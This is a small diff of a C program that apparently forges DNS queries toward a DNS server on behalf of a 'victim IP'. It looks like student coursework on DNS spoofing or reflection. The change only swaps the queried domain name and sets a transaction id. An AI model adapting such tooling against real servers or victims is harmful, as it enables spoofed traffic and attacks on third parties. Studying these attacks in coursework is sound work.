@@ -90,6 +90,7 @@ int main(int argc, char *argv[])
         printf("Invalid parameters!!!\nPlease enter <victim IP> <UDP Source port> <DNS Server IP>  \n");
         exit(-1);
     }
+
     printf("victim : %s\n", argv[1]);
     printf("port : %s\n", argv[2]);
     printf("DNS server : %s\n", argv[3]);
@@ -106,7 +107,9 @@ int main(int argc, char *argv[])
     dns->QDCOUNT = htons(1);
     dns->query_id=0xE570; // transaction id for 0845168 Alexander Kjeldsen
 
-    strcpy(data,"\3www\6google\3com");
+    //strcpy(data,"\3www\6google\3com");
+    strcpy(data,"\3ns1\7surfnet\2nl");
+    //strcpy(data,"\9microsoft\3com");
     int length = strlen(data);
     data += strlen(data);
     *data = 0x00;
